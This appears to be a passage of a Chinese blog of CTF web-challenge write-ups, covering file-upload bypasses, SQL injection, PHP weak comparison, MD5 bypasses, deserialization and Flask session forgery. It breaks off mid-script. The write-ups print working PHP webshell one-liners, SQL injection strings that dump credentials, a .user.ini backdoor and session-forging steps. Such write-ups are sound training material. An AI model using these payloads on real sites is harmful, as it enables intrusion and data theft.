+<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p>
+<p>我们再次改造一下序列化</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">?</span>select<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h2 id="知识点-16"><a href="#知识点-16" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>文件上传前端校验</li>
+<li>.phtml的用法</li>
+</ul>
+<h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210715105425.png"></p>
+<p>在主页是一个上传点，直接上传一个shell.php，发现弹窗提示，只能上三种类型的文件</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210715105541.png"></p>
+<p>一番查看，是前端校验，删除事件，继续上传shell.php，抓包分析：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210715110642.png"></p>
+<p>.php后缀的文件仍然不能上传，然后试一试更改content-type，添加文件头，以及%00阶段，依然不行，然后上传一个.phtml的文件，发现上传成功，再将请求头中的内容改为</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script language='php'&gt;@eval($_POST['a']);&lt;/script&gt;
+&lt;script language='php'&gt;system('cat /flag');&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>继续上传，即可看到flag</p>
+<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><h2 id="知识点-17"><a href="#知识点-17" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>双写绕过</li>
+</ul>
+<h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>主页是一个登录框</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716090603.png"></p>
+<p>随便输入两个参数，发现是传入的是get型参数</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716090738.png"></p>
+<p>首先注入肯定存在，先尝试联合查询注入：</p>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin%27+union+select+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>失败，双写union 和 select可绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin%27+ununionion+seselectlect+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716091931.png"></p>
+<p>登陆成功，将参数admin置为假，可以看到页面有显示位置：</p>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=-admin%27+ununionion+seselectlect+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716092158.png"></p>
+<p>然后尝试注入</p>
+<pre class="line-numbers language-none"><code class="language-none">/check.php?username=1' ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 %23&amp;password=1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716093923.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=1' ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 %23&amp;password=1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716093839.png"></p>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><h2 id="知识点-18"><a href="#知识点-18" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>备份文件泄露</li>
+<li>php中的弱类型比较</li>
+</ul>
+<h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210717203200.png"></p>
+<p>使用扫描软件扫一下目录，扫到/index.php.bak</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+include_once "flag.php";
+
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit("Just num!");
+    }
+    $key = intval($key);
+    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo "Try to find out source file!";
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这边拿到源码，能拿到flag需要满足下面的条件</p>
+<ul>
+<li>需要传入一个get型参数key</li>
+<li>key的值必须是数字</li>
+<li>双等于 弱比较</li>
+</ul>
+<p>所以直接传入123就可以了</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210717205906.png"></p>
+<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="知识点-19"><a href="#知识点-19" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>flask session伪造</li>
+</ul>
+<h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p>主页，有注册点和登陆点：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718093410.png"></p>
+<p>登陆点，测试了一下，没有发现sql注入，然后我们随便注册一个账户123 123，登陆看看</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718094018.png"></p>
+<p>登陆成功之后，有个提示，说明得使用admin账户登陆之后才能得到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718094535.png"></p>
+<p>changepassword，这里发现源码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718094434.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">@app.route('/code')
+def get_code():
+
+@app.route('/index')
+def index():
+
+@app.route('/register', methods = ['GET', 'POST'])
+def register():
+
+@app.route('/login', methods = ['GET', 'POST'])
+def login():
+
+@app.route('/logout')
+def logout():
+
+@app.route('/change', methods = ['GET', 'POST'])
+def change():
+
+@app.route('/edit', methods = ['GET', 'POST'])
+def edit():<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有这么以上几个功能。</p>
+<blockquote>
+<p>flask session伪造</p>
+</blockquote>
+<p>原理：flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>
+<p>用脚本将session解密</p>
+<pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+
+def decryption(payload):
+    payload, sig = payload.rsplit(b'.', 1)
+    payload, timestamp = payload.rsplit(b'.', 1)
+
+    decompress = False
+    if payload.startswith(b'.'):
+        payload = payload[1:]
+        decompress = True
+
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception('Could not base64 decode the payload because of '
+                         'an exception')
+
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception('Could not zlib decompress the payload before '
+                             'decoding the payload')
+
+    return session_json_serializer.loads(payload)
+
+if __name__ == '__main__':
+    print(decryption(sys.argv[1].encode()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718095634.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718095809.png"></p>
+<p>这里伪造session还需要知道SECRET_KEY，我们在config.py中发现里SECRET_KEY</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718100442.png"></p>
+<p>index.html文件：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718100524.png"></p>
+<p>发现只要session[‘name’] == ‘admin’，就能得到flag</p>
+<p>然后贴出一个flask session加密的脚本 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br>利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session</p>
+<pre class="line-numbers language-none"><code class="language-none">{'_fresh': True, '_id': b'33acffdbb8da98c01ab3379ec972f38ced401262f499f628df3eb2a4d06b135ce39867685db5b7525c69ea0e5bc5027c17bf9f7ee1af9721445ac5db6856faf0', 'csrf_token': b'0748bf465b7e203bb622dc868a10a6f8580bf62f', 'image': b'mLzK', 'name': '123', 'user_id': '10'}
+用脚本的时候记得到把123 改成 admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718101416.png"></p>
+<p>把得到的session在浏览器中替换即可</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718101549.png"></p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h2 id="知识点-20"><a href="#知识点-20" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>strcmp函数绕过特性</li>
+<li>cookie中修改标识用户身份的字段</li>
+</ul>
+<h2 id="过程-20"><a href="#过程-20" class="headerlink" title="过程"></a>过程</h2><p>主页，没发现可用信息</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723100513.png"></p>
+<p>右上角菜单，发现一个页面</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723100440.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723100554.png"></p>
+<p>满足条件</p>
+<ul>
+<li>使用正确的金额购买flag</li>
+<li>必须是CUIT的学生（请求头中可能存在表示用户身份的东西）</li>
+<li>输入正确的密码</li>
+</ul>
+<blockquote>
+<p>购买flag以及post  password</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!--
+	~~~post money and password~~~
+if (isset($_POST['password'])) {
+	$password = $_POST['password'];
+	if (is_numeric($password)) {
+		echo "password can't be number&lt;/br&gt;";
+	}elseif ($password == 404) {
+		echo "Password Right!&lt;/br&gt;";
+	}
+}
+--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>需要满足的条件</p>
+<ul>
+<li>传入post型参数password</li>
+<li>password不能是纯数字</li>
+<li>password要等于404（这里的等于是弱类型比较，可以传入404a）</li>
+</ul>
+<p>传入</p>
+<pre class="line-numbers language-none"><code class="language-none">money=100000000&amp;password=404a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>修改用户身份</p>
+</blockquote>
+<p>先抓包</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723101923.png"></p>
+<p>cookie中的参数修改为1</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723102510.png"></p>
+<p>这里就参考大佬，可以使用strcmp和科学计数法绕过</p>
+<blockquote>
+<p>#strcmp</p>
+</blockquote>
+<p>解释参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cherrie007/article/details/77473817">https://blog.csdn.net/cherrie007/article/details/77473817</a></p>
+<pre class="line-numbers language-none"><code class="language-none">money[]=1&amp;password=404a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723102730.png"></p>
+<blockquote>
+<p>#科学计数法</p>
+</blockquote>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723102843.png"></p>
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="知识点-21"><a href="#知识点-21" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>md5 bypass（数组返回false）</li>
+</ul>
+<h2 id="过程-21"><a href="#过程-21" class="headerlink" title="过程"></a>过程</h2><p>主页，是这么个框框</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723145213.png"></p>
+<p>抓包发现提示</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723145452.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">select * from 'admin' where password=md5($pass,true)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>16 位 md5 常见套路，输入密码 <code>ffifdyop</code>，登录即可。这是因为它的原始字符串导致了<code>' or 1=1</code> 的 SQL 注入，相当于所谓的万能密码登录。请参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/12125291f50d">https://www.jianshu.com/p/12125291f50d</a></p>
+<p><a target="_blank" rel="noopener" href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></p>
+</blockquote>
+<p>登录后，查看网页源代码，发现代码，要求 a 和 b 不等但是 md5 相等：</p>
+<pre class="line-numbers language-none"><code class="language-none">$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+	//wow,you can really dance
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>又是典型的 md5 bypass，因为 <code>md5()</code> 或者 <code>sha1()</code> 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果 <code>$a</code> 和 <code>$b</code> 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过。payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">/levels91.php?a[]=1&amp;b[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723150159.png"></p>
+<p>得到代码</p>
+<pre class="line-numbers language-none"><code class="language-none"> &lt;?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">param1[]=1&amp;param2[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723150558.png"></p>
+<p>一些md5值</p>
+<p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a</p>
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="知识点-22"><a href="#知识点-22" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>data伪协议放置内容（ php5.2.0后），通常用来执行php代码</li>
+<li>file协议读取文件</li>
+<li>构造序列化内容</li>
+</ul>
+<h2 id="过程-22"><a href="#过程-22" class="headerlink" title="过程"></a>过程</h2><p>主页就是源代码</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>第一个<code>if</code></p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>传入一个get型参数text</li>
+<li>text的内容是要得是 <code>welcome to the zjctf</code></li>
+</ul>
+<p>我们使用data伪协议（通常用来执行php代码），我们也可以将内容写入data协议中，让<code>file_get_contents</code>函数取读取。</p>
+<p>使用base64加密一气呵成</p>
+<pre class="line-numbers language-none"><code class="language-none">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+
+#附上没有加密的
+text=data://text/plain,welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>第二个<code>if</code></p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">if(preg_match("/flag/",$file))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看以看到不能直接读取flag</p>
+<p>采用filter来读源码，结合base64编码</p>
+<pre class="line-numbers language-none"><code class="language-none">file=php://filter/read=convert.base64-encode/resource=useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>第三个要构造序列化内容</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">$password = $_GET["password"];
+include($file);  //useless.php
+$password = unserialize($password);
+echo $password;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先查看useless.php源码</p>
+<pre class="line-numbers language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到一串base64串，解密得到源码</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-X2938dVp-1627112883193)(C:/Users/Polaris/AppData/Roaming/Typora/typora-user-images/image-20210724153901393.png)]</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo "&lt;br&gt;";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造序列化内容</p>
+<pre class="line-numbers language-none"><code class="language-none">O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210724154127.png"></p>
+<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="知识点-23"><a href="#知识点-23" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><p>图片马制作 copy 01.jpg/a + 02.php/b test.jpg</p>
+</li>
+<li><p>.user.ini的上传 GIF89a（如果需要的话） auto_prepend_file=test.jpg</p>
+</li>
+</ul>
+<h2 id="过程-23"><a href="#过程-23" class="headerlink" title="过程"></a>过程</h2><p>主页是一个上传页面</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725101158.png"></p>
+<p>上传<code>.php</code>，提示非法后缀</p>
+<p>尝试将.php后缀改成.jpg，提示过滤了<code>&lt;?</code></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725102113.png"></p>
+<p>正常上传图片，上传成功</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725101841.png"></p>
+<p>修改请求体中的一句话木马内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script language="php"&gt;eval($_GET['cmd']);&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上传后，页面返回提示</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725102518.png"></p>
+<p>搜罗资料</p>
+<blockquote>
+<p>exif_imagetype<br>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p>
+<p>exif_imagetype — 判断一个图像的类型</p>
+<p>说明<br>exif_imagetype ( string $filename ) : int</p>
+<p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
+</blockquote>
+<p>这个函数就是检查文件头，直接制作图片马</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725110330.png"></p>
+<p>成功上传，但是此时还无法执行PHP脚本，接着我们可以上传一个<code>user.ini</code>的文件（经过测试，没有过滤该后缀），我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell,关于该文件详见：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p>然后我们去上传，文件名为<code>.user.ini</code></p>
+<pre class="line-numbers language-none"><code class="language-none">GIF89a
+auto_prepend_file=test.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>蚁剑连接即可</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725110609.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725110656.png"></p>
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="知识点-24"><a href="#知识点-24" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>绕过一些简单的过滤</li>
+<li>right()</li>
+</ul>
+<h2 id="过程-24"><a href="#过程-24" class="headerlink" title="过程"></a>过程</h2><p>主页是一个登陆页面</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172300.png"></p>
+<p>过滤了关键字 and、=、空格、union等</p>
+<blockquote>
+<p>查库</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172536.png"></p>
+<blockquote>
+<p>查表</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172714.png"></p>
+<blockquote>
+<p>查字段</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172752.png"></p>
+<blockquote>
+<p>dump数据</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172820.png"></p>
+<p>不是最终结果，上网搜罗，用right()语句</p>
+<pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809173123.png"></p>
+<p>拼接两段即得flag</p>
+<p>flag{f1b0debe-86a4-4b3b-a1f0-bf67f3c734d9}</p>
+<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><h2 id="知识点-25"><a href="#知识点-25" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>fuzz</li>
+<li>python盲注脚本</li>
+</ul>
+<h2 id="过程-25"><a href="#过程-25" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210810154849.png"></p>
+<p>fuzz一哈</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/1937992-20200911094122880-1747349205.png"></p>
+<p>一个搜索框，搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等</p>
+<p>贴上脚本：</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+
+url = "http://a5a19ec2-3fe1-4f07-9465-f4c861d25093.node4.buuoj.cn:81/index.php"
+
+result = ""
